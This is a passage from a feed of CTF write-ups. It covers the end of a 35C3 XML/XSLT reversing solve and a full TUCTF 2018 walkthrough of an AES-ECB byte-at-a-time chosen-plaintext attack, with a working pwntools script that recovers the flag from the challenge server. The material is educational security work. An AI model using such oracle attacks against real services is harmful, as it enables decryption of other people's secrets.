class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">दाल</span>&gt;</span>4<span class="tag">&lt;/<span class="name">दाल</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">drinks</span>&gt;</span>random_number_extracted<span class="tag">&lt;/<span class="name">drinks</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure><p>We need 5 plates of <strong>Борщ</strong> because we need to reduce the count of <strong>chef-drinks</strong> to zero, and each iteration of <strong>Борщ</strong> will reduce the <strong>$chef-drinks</strong> by one, the final plate <strong>दाल</strong> is to finally print the flag, so I wrote two scripts to do this the first one is a simplified version of my bash script:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1=$(ncat 35.246.237.11 1 &lt; solution.xml | grep -Poh <span class="string">'\d&#123;4,&#125;'</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$var1</span>;</span><br></pre></td></tr></table></figure><p>Before the python script I prepared this xml file so I didn’t need to create every tag in python:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meal</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">course</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Борщ</span>&gt;</span>1<span class="tag">&lt;/<span class="name">Борщ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">दाल</span>&gt;</span>4<span class="tag">&lt;/<span class="name">दाल</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plate</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">course</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">meal</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>And finally my python script:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line">tree = ET.parse(<span class="string">'solution2.xml'</span>)</span><br><span class="line">root = tree.getroot()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">100</span>):</span><br><span class="line">a =  subprocess.check_output([<span class="string">'bash'</span>,<span class="string">'rofl.sh'</span>]).strip().split(<span class="string">' '</span>)</span><br><span class="line"><span class="keyword">if</span> (len(a[<span class="number">0</span>]) == <span class="number">50</span>):</span><br><span class="line">state = root.getchildren()[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>,<span class="number">10</span>):</span><br><span class="line">b = ET.SubElement(state,<span class="string">'drinks'</span>)</span><br><span class="line">b.text = a[<span class="number">0</span>][i:i+<span class="number">10</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment"># create a new XML file with the results</span></span><br><span class="line">mydata = <span class="string">"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n"</span>+ET.tostring(root, encoding=<span class="string">"utf-8"</span>) +<span class="string">'\n\n'</span>  </span><br><span class="line">myfile = open(<span class="string">"items2.xml"</span>, <span class="string">"w"</span>)  </span><br><span class="line">myfile.write(mydata)</span><br></pre></td></tr></table></figure></p><p>And now running it all:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$  bash -c <span class="string">"python juggle.py &amp;&amp; ncat 35.246.237.11 1 &lt; items2.xml"</span></span><br><span class="line">Reading input document from stdin...</span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;&lt;all&gt;&lt;flag&gt;35C3_The_chef_gives_you_his_compliments&lt;/flag&gt;&lt;/all&gt;</span><br></pre></td></tr></table></figure><p>The flag was 35C3_The_chef_gives_you_his_compliments</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;    juggle 97&lt;br&gt;&lt;br&gt;    Solves: 54&lt;br&gt;&lt;br&gt;    Can you help this restaurant Stack the right amount of Eggs in their ML algor
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="35C3" scheme="https://teamrocketist.github.io/tags/35C3/"/>
    
      <category term="random" scheme="https://teamrocketist.github.io/tags/random/"/>
    
      <category term="xslt" scheme="https://teamrocketist.github.io/tags/xslt/"/>
    
  </entry>
  
  <entry>
    <title>[Crypto] TUCTF 2018 - AESential Lesson</title>
    <link href="https://teamrocketist.github.io/2018/11/26/Crypto-TUCTF-2018-AESential-Lesson/"/>
    <id>https://teamrocketist.github.io/2018/11/26/Crypto-TUCTF-2018-AESential-Lesson/</id>
    <published>2018-11-26T06:51:39.000Z</published>
    <updated>2018-11-26T06:56:28.181Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>AESential Lesson<br>465<br><br>Thought I’d give you an essential lesson to how you shouldn’t get input for AES in ECB mode.<br><br>nc 18.218.238.95 12345<br></blockquote><p>Learning by the description we can already know the cryptography used here is <strong>AES ECB mode</strong>, we are provided a file with the encryption process:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> select <span class="keyword">import</span> select</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">INTRO = <span class="string">"""</span></span><br><span class="line"><span class="string">Lol. You think you can steal my flag?</span></span><br><span class="line"><span class="string">I\'ll even encrypt your input for you,</span></span><br><span class="line"><span class="string">but you can\'t get my secrets!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">"REDACTED"</span> <span class="comment"># TODO Redact this</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">"REDACTED"</span> <span class="comment"># TODO Redact this</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">padc = <span class="string">'REDACTED'</span> <span class="comment">#TODO Redact this</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (len(flag) == <span class="number">32</span>) <span class="keyword">and</span> (len(key) == <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">sys.stdout.write(INTRO)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sys.stdout.write(<span class="string">'Enter your text here: '</span>)</span><br><span class="line">sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">rlist, _, _ = select([sys.stdin], [], [])</span><br><span class="line"></span><br><span class="line">inp = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> rlist:</span><br><span class="line">inp = sys.stdin.readline().rstrip(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">plaintext = inp + flag</span><br><span class="line">l = len(plaintext)</span><br><span class="line"></span><br><span class="line">padl = (l // <span class="number">32</span> + <span class="number">1</span>)*<span class="number">32</span> <span class="keyword">if</span> l % <span class="number">32</span> != <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">plaintext = plaintext.ljust(padl, padc)</span><br><span class="line"><span class="comment">#print plaintext</span></span><br><span class="line"></span><br><span class="line">sys.stdout.write(<span class="string">'Here\'s your encrypted text:\n&#123;&#125;\n\n'</span>.format((cipher.encrypt(plaintext)).encode(<span class="string">'hex'</span>)))</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>By looking at the script we can already see, the flag has 32 bytes of size, the key as well, the encryption method processes as follows, since it’s <strong>ECB</strong> we know the plaintext will be split in blocks of 16 bytes and for each block will be applied the AES encryption function with the key provided in the file:<br><a data-fancybox="gallery" href="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/ECB_encryption.svg/601px-ECB_encryption.svg.png" target="_blank" rel="noopener"><br><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d6/ECB_encryption.svg/601px-ECB_encryption.svg.png" alt=""><br></a></p><p>Before the encryption we can see the program asks for an input to be encrypted, the input is concatenated with the flag and then it’s applied some padding to fill the last blocks, for example imagine the padding character is 1, the sent input is ‘A’ and the respective flag is ‘TUCTF{MY_B34UT1FULL_FL4G_L0L_XD}’ the padding will be applied to the plaintext as follows:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">ATUCTF&#123;MY_B34UT1      FULL_FL4G_L0L_XD      &#125;111111111111111      1111111111111111</span><br></pre></td></tr></table></figure><p>After this as described before the encryption is applied to each block with a key, now we can perform an attack without needing the key, we can bruteforce the flag byte by byte, imagine we sent an input of 15 ‘A’s the first block of the plaintext and ciphertext will be as follows (The key in this examples is a random key chosen by me):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4               </span><br><span class="line">AAAAAAAAAAAAAAAT      UCTF&#123;MY_B34UT1FU      L_FL4G_L0L_XD&#125;1       1111111111111111</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3</span><br><span class="line">82b094debf0605ef9d46ad671ac3605d 08663b2c2a83bd539e14e2ea671035c4 b2140d0e9125ca1de2cd1ea85d21ae7e </span><br><span class="line"></span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now we know that <strong>input + 1st_char_of_the_flag</strong> its corresponding ciphertext is the <strong>1st block</strong>, now we just need to send the inputs for every character possible until we match the <strong>1st</strong> ciphertext we got with the input of <strong>14 “A”s</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">AAAAAAAAAAAAAAAA 207ca0ee7f5bdb8897caa7b1f8ff2157</span><br><span class="line">AAAAAAAAAAAAAAAB 9884f8e45e5ea527ca6c9b090bef5e64</span><br><span class="line">AAAAAAAAAAAAAAAC e422f4ff06175cfe7e00b3002bd8b464</span><br><span class="line">      ....                   .......</span><br><span class="line">AAAAAAAAAAAAAAAT 82b094debf0605ef9d46ad671ac3605d</span><br></pre></td></tr></table></figure><p>As we can see from above we matched the <strong>82b094debf0605ef9d46ad671ac3605d</strong>, we now know the first character of the flag is <strong>T</strong>, well we already knew that! but this was just a confirmation :), using this method we can get the first 16 bytes of the flag, but how can we get the last 16 ? For this we need to find the padding character we can do this by sending an <strong>A</strong> to the server, imagine the padding character is <strong>_</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">ATUCTF&#123;MY_B34UT1      FULL_FL4G_L0L_XD      &#125;_______________      ________________</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3                           </span><br><span class="line">7a80f91bcf406446befb10e0720b8a7d ece296fd74e495dc5b2890596777f3eb 2a5831079c0a0591601f25278f4623f3 </span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now we want to extract the <strong>block 3</strong> or the <strong>block 4</strong> cipher, <strong>block 3</strong> also works because we actually know that the last byte of the flag is <strong>}</strong>, so making an example using block 3 <strong>2a5831079c0a0591601f25278f4623f3</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">&#125;000000000000000 5f87ae73237e86dd625e820ba93056e0</span><br><span class="line">&#125;111111111111111 d9044a33bc1e523222289c56a6505c79</span><br><span class="line">&#125;222222222222222 774066300cda4278f32729b032a3bfe7</span><br><span class="line">      ....                   .......</span><br><span class="line">&#125;_______________ 2a5831079c0a0591601f25278f4623f3</span><br></pre></td></tr></table></figure><p>Now that we have the <strong>padding character</strong>, we need to work something similar on how we got the 1st part of the flag, but now instead of comparing with the <strong>1st block</strong> of the cipher we want to compare it with the <strong>3rd block</strong> by sending an <strong>A</strong> we get the 3rd block cipher:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">ATUCTF&#123;MY_B34UT1      FULL_FL4G_L0L_XD      &#125;_______________      ________________</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3                           </span><br><span class="line">7a80f91bcf406446befb10e0720b8a7d ece296fd74e495dc5b2890596777f3eb 2a5831079c0a0591601f25278f4623f3 </span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now we test all characters until we match this <strong>block3</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">0_______________ 545506ce0fa14673dba3d92a09a28774</span><br><span class="line">1_______________ a26f177d5ef506e40e79411f4a1ef0bf</span><br><span class="line">2_______________ a4a7aee9adba7af7d709662da5c19aee</span><br><span class="line">      ....                   .......</span><br><span class="line">&#125;_______________ 2a5831079c0a0591601f25278f4623f3</span><br></pre></td></tr></table></figure><p>With this we get the last character of the <strong>flag</strong>, now repeat this for the rest of the characters, I’ll give one more example how to get the next character, sending <strong>“AA”</strong> as input:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Plaintext</span><br><span class="line">Block1                Block2                Block3                Block4</span><br><span class="line">AATUCTF&#123;MY_B34UT      1FULL_FL4G_L0L_X      D&#125;______________      ________________</span><br><span class="line"></span><br><span class="line">Ciphertext</span><br><span class="line">Block1                           Block2                           Block3                           </span><br><span class="line">6ca95659b3828138ff0408db597a6614 45551fa5b4b751017e717e2e4193cc8d 3c872cee5f361ca44e66a554602ee1c3 </span><br><span class="line">Block4</span><br><span class="line">e845fa5520b78d20bdd0ff93339df9fe</span><br></pre></td></tr></table></figure><p>Now brute force it like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Plain Block1     Cipher Block1</span><br><span class="line">0&#125;______________ 6ef0fae728efd2738f1a5f179f6980a8</span><br><span class="line">1&#125;______________ 2c851b1a58399ffdc6b1c4ed23287fa7</span><br><span class="line">2&#125;______________ 664fafa0563cc1b84931daf6cf1cbc68</span><br><span class="line">      ....                   .......</span><br><span class="line">D&#125;______________ 3c872cee5f361ca44e66a554602ee1c3</span><br></pre></td></tr></table></figure><p>Repeat this and you’ll get every character of the flag, the python script I implemented for this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">r = remote(<span class="string">'18.218.238.95'</span>, <span class="number">12345</span>)</span><br><span class="line"><span class="comment">#r = process('./redacted.py')</span></span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'Enter your text here: '</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag == <span class="string">''</span>:</span><br><span class="line">r.sendline(<span class="string">'A'</span>*<span class="number">15</span>)</span><br><span class="line">encrypted_first =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">15</span>-i) + flag+c)</span><br><span class="line">encrypted =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> encrypted[:<span class="number">32</span>] == encrypted_first[:<span class="number">32</span>]:</span><br><span class="line">flag += c</span><br><span class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">15</span>-i<span class="number">-1</span>))</span><br><span class="line">encrypted_first = re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">padding_char = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> padding_char == <span class="string">''</span>:</span><br><span class="line">r.sendline(<span class="string">'A'</span>*<span class="number">1</span>)</span><br><span class="line">encrypted_first =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> string.printable:</span><br><span class="line">p = <span class="string">'&#125;'</span>+ x*<span class="number">15</span></span><br><span class="line">r.sendline(p)</span><br><span class="line">encrypted =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> encrypted[:<span class="number">32</span>] == encrypted_first[<span class="number">64</span>:<span class="number">64</span>+<span class="number">32</span>]:</span><br><span class="line">padding_char = x</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'&#125;'</span>*<span class="number">1</span>)</span><br><span class="line">encrypted_first =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag_part2 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">p = c+flag_part2 + (i<span class="number">-1</span>)*padding_char</span><br><span class="line">r.sendline(p)</span><br><span class="line">encrypted =  re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> encrypted[:<span class="number">32</span>] == encrypted_first[<span class="number">64</span>:<span class="number">64</span>+<span class="number">32</span>]:</span><br><span class="line">flag_part2 = c + flag_part2</span><br><span class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">17</span>-i+<span class="number">1</span>))</span><br><span class="line">encrypted_first = re.findall(<span class="string">r'[a-f0-9]&#123;32,&#125;'</span>, r.recvuntil(<span class="string">'Enter your text here: '</span>))[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> flag+flag_part2</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>Running it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">python reeas.py </span><br><span class="line">[+] Starting <span 